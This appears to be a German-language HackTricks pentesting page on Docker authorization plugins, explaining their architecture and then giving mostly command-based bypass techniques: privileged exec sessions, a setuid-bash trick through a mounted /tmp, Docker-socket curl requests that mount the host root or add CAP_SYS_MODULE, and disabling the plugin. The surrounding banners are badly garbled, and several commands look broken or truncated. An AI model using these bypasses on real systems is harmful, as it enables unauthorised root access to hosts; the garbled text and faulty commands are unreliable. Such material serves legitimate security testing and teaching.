{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


**Das** Standard-**Autorisierungs**modell von **Docker** ist **alles oder nichts**. Jeder Benutzer mit Berechtigung zum Zugriff auf den Docker-Daemon kann **beliebige** Docker-Client-**Befehle** **ausführen**. Das Gleiche gilt für Aufrufer, die die Docker-Engine-API verwenden, um den Daemon zu kontaktieren. Wenn Sie **größere Zugriffskontrolle** benötigen, können Sie **Autorisierungs-Plugins** erstellen und diese zu Ihrer Docker-Daemon-Konfiguration hinzufügen. Mit einem Autorisierungs-Plugin kann ein Docker-Administrator **feingranulare Zugriffs**richtlinien für die Verwaltung des Zugriffs auf den Docker-Daemon **konfigurieren**.

# Grundarchitektur

Docker Auth-Plugins sind **externe** **Plugins**, die Sie verwenden können, um **Aktionen** zu **erlauben/zu verweigern**, die an den Docker-Daemon **angefordert** werden, **abhängig** von dem **Benutzer**, der sie angefordert hat, und der **angeforderten** **Aktion**.

**[Die folgenden Informationen stammen aus den Dokumenten](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Wenn eine **HTTP**-**Anfrage** an den Docker-**Daemon** über die CLI oder über die Engine-API gesendet wird, **leitet** das **Authentifizierung**-**Subsystem** die Anfrage an das installierte **Authentifizierungs**-**Plugin**(s) weiter. Die Anfrage enthält den Benutzer (Aufrufer) und den Kontext des Befehls. Das **Plugin** ist dafür verantwortlich, zu entscheiden, ob die Anfrage **erlaubt** oder **verweigert** wird.

Die Sequenzdiagramme unten zeigen einen Erlauben- und Verweigern-Autorisierungsfluss:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Jede an das Plugin gesendete Anfrage **enthält den authentifizierten Benutzer, die HTTP-Header und den Anfrage-/Antwortkörper**. Nur der **Benutzername** und die **verwendete Authentifizierungsmethode** werden an das Plugin übergeben. Am wichtigsten ist, dass **keine** Benutzer-**Anmeldeinformationen** oder Tokens übergeben werden. Schließlich werden **nicht alle Anfrage-/Antwortkörper** an das Autorisierungs-Plugin gesendet. Nur die Anfrage-/Antwortkörper, bei denen der `Content-Type` entweder `text/*` oder `application/json` ist, werden gesendet.

Für Befehle, die potenziell die HTTP-Verbindung übernehmen können (`HTTP Upgrade`), wie `exec`, wird das Autorisierungs-Plugin nur für die anfänglichen HTTP-Anfragen aufgerufen. Sobald das Plugin den Befehl genehmigt, wird die Autorisierung nicht auf den Rest des Flusses angewendet. Insbesondere werden die Streaming-Daten nicht an die Autorisierungs-Plugins übergeben. Für Befehle, die chunked HTTP-Antworten zurückgeben, wie `logs` und `events`, wird nur die HTTP-Anfrage an die Autorisierungs-Plugins gesendet.

Während der Verarbeitung von Anfrage/Aantwort müssen einige Autorisierungsflüsse möglicherweise zusätzliche Abfragen an den Docker-Daemon durchführen. Um solche Flüsse abzuschließen, können Plugins die Daemon-API ähnlich wie ein regulärer Benutzer aufrufen. Um diese zusätzlichen Abfragen zu ermöglichen, muss das Plugin die Mittel bereitstellen, damit ein Administrator geeignete Authentifizierungs- und Sicherheitsrichtlinien konfigurieren kann.

## Mehrere Plugins

Sie sind verantwortlich für die **Registrierung** Ihres **Plugins** als Teil des Docker-Daemon-**Starts**. Sie können **mehrere Plugins installieren und sie miteinander verketten**. Diese Kette kann geordnet sein. Jede Anfrage an den Daemon durchläuft die Kette in der Reihenfolge. Nur wenn **alle Plugins den Zugriff** auf die Ressource gewähren, wird der Zugriff gewährt.

# Plugin-Beispiele

## Twistlock AuthZ Broker

Das Plugin [**authz**](https://github.com/twistlock/authz) ermöglicht es Ihnen, eine einfache **JSON**-Datei zu erstellen, die das **Plugin** zum **Autorisieren** der Anfragen **lesen** wird. Daher haben Sie die Möglichkeit, sehr einfach zu steuern, welche API-Endpunkte jeden Benutzer erreichen können.

Dies ist ein Beispiel, das es Alice und Bob erlaubt, neue Container zu erstellen: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Auf der Seite [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) finden Sie die Beziehung zwischen der angeforderten URL und der Aktion. Auf der Seite [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) finden Sie die Beziehung zwischen dem Aktionsnamen und der Aktion.

## Einfaches Plugin-Tutorial

Sie finden ein **einfach zu verstehendes Plugin** mit detaillierten Informationen zur Installation und Fehlersuche hier: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lesen Sie die `README` und den Code in `plugin.go`, um zu verstehen, wie es funktioniert.

# Docker Auth Plugin Umgehung

## Zugriff auflisten

Die wichtigsten Punkte, die zu überprüfen sind, sind die **erlaubten Endpunkte** und **welche Werte von HostConfig erlaubt sind**.

Um diese Auflistung durchzuführen, können Sie das Tool [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## Nicht erlaubtes `run --privileged`

### Minimale Berechtigungen
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Ausführen eines Containers und dann Erhalten einer privilegierten Sitzung

In diesem Fall **verbot der Sysadmin den Benutzern, Volumes zu mounten und Container mit dem `--privileged`-Flag auszuführen** oder dem Container zusätzliche Berechtigungen zu geben:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Jedoch kann ein Benutzer **eine Shell im laufenden Container erstellen und ihr die zusätzlichen Berechtigungen geben**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Jetzt kann der Benutzer den Container mit einer der [**bereits besprochenen Techniken**](./#privileged-flag) verlassen und **Privilegien eskalieren** innerhalb des Hosts.

## Schreibbares Verzeichnis einbinden

In diesem Fall **verbot der Sysadmin den Benutzern, Container mit dem `--privileged`-Flag auszuführen** oder dem Container zusätzliche Berechtigungen zu geben, und er erlaubte nur das Einbinden des `/tmp`-Verzeichnisses:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Beachten Sie, dass Sie möglicherweise den Ordner `/tmp` nicht einhängen können, aber Sie können einen **anderen beschreibbaren Ordner** einhängen. Sie können beschreibbare Verzeichnisse mit folgendem Befehl finden: `find / -writable -type d 2>/dev/null`

**Beachten Sie, dass nicht alle Verzeichnisse auf einer Linux-Maschine das suid-Bit unterstützen!** Um zu überprüfen, welche Verzeichnisse das suid-Bit unterstützen, führen Sie `mount | grep -v "nosuid"` aus. Zum Beispiel unterstützen normalerweise `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` und `/var/lib/lxcfs` nicht das suid-Bit.

Beachten Sie auch, dass Sie, wenn Sie **/etc** oder einen anderen Ordner **mit Konfigurationsdateien** einhängen können, diese als Root aus dem Docker-Container ändern können, um sie **auf dem Host auszunutzen** und Privilegien zu eskalieren (möglicherweise durch Modifikation von `/etc/shadow`).
{% endhint %}

## Ungeprüfter API-Endpunkt

Die Verantwortung des Systemadministrators, der dieses Plugin konfiguriert, besteht darin, zu kontrollieren, welche Aktionen und mit welchen Berechtigungen jeder Benutzer ausführen kann. Daher könnte der Administrator, wenn er einen **Blacklist**-Ansatz mit den Endpunkten und den Attributen verfolgt, **einige davon vergessen**, die es einem Angreifer ermöglichen könnten, **Privilegien zu eskalieren.**

Sie können die Docker-API unter [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) überprüfen.

## Ungeprüfte JSON-Struktur

### Binds im Root

Es ist möglich, dass der Systemadministrator beim Konfigurieren der Docker-Firewall **ein wichtiges Parameter** der [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) wie "**Binds**" **vergessen hat**.\
Im folgenden Beispiel ist es möglich, diese Fehlkonfiguration auszunutzen, um einen Container zu erstellen und auszuführen, der den Root (/) Ordner des Hosts einhängt:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Beachten Sie, dass wir in diesem Beispiel den **`Binds`**-Parameter als Schlüssel auf der obersten Ebene im JSON verwenden, aber in der API erscheint er unter dem Schlüssel **`HostConfig`**.
{% endhint %}

### Binds in HostConfig

Befolgen Sie die gleichen Anweisungen wie bei **Binds in root**, indem Sie diese **Anfrage** an die Docker API senden:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Befolgen Sie die gleichen Anweisungen wie bei **Binds in root** und führen Sie diese **Anfrage** an die Docker API aus:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Befolgen Sie die gleichen Anweisungen wie bei **Binds in root**, indem Sie diese **Anfrage** an die Docker API senden:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Es ist möglich, dass der Sysadmin beim Konfigurieren der Docker-Firewall **ein wichtiges Attribut eines Parameters** der [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) wie "**Capabilities**" innerhalb von "**HostConfig**" **vergessen hat**. Im folgenden Beispiel ist es möglich, diese Fehlkonfiguration auszunutzen, um einen Container mit der **SYS\_MODULE**-Berechtigung zu erstellen und auszuführen:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Die **`HostConfig`** ist der Schlüssel, der normalerweise die **interessanten** **Befugnisse** enthält, um aus dem Container zu entkommen. Beachten Sie jedoch, wie die Verwendung von Binds außerhalb davon ebenfalls funktioniert und Ihnen möglicherweise ermöglicht, Einschränkungen zu umgehen.
{% endhint %}

## Deaktivieren des Plugins

Wenn der **Sysadmin** **vergessen** hat, die Möglichkeit zu **verbieten**, das **Plugin** zu **deaktivieren**, können Sie dies ausnutzen, um es vollständig zu deaktivieren!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Denke daran, das **Plugin nach der Eskalation wieder zu aktivieren**, sonst funktioniert ein **Neustart des Docker-Dienstes nicht**!

## Auth Plugin Bypass Writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Referenzen
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
